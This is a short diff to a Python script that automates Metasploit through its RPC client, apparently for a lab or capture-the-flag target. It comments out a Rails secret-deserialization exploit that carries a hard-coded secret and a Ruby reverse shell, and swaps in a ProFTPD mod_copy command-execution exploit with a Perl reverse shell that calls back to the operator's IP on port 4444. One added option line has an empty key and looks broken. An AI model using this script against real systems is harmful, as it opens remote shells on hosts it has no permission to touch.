@@ -19,7 +19,7 @@ def main(argv):
     target_ip = argv[3]
 
     client = MsfRpcClient('kali')
-
+'''    
     exploit = client.modules.use('exploit', 'multi/http/rails_secret_deserialization')
     payload = client.modules.use('payload', 'ruby/shell_reverse_tcp')
 
@@ -27,6 +27,16 @@ def main(argv):
     exploit['RPORT'] = 8181
     exploit['TARGETURI'] = '/'
     exploit['SECRET'] = 'a7aebc287bba0ee4e64f947415a94e5f'
+    payload['LHOST'] = my_ip
+    payload['LPORT'] = 4444
+'''
+
+    exploit = client.modules.use('exploit', 'unix/ftp/proftpd_modcopy_exec')
+    payload = client.modules.use('payload', 'cmd/unix/reverse_perl')
+
+    exploit['RHOSTS'] = target_ip
+    
+    exploit[''] = '/'
     payload['LHOST'] = my_ip
     payload['LPORT'] = 4444
 
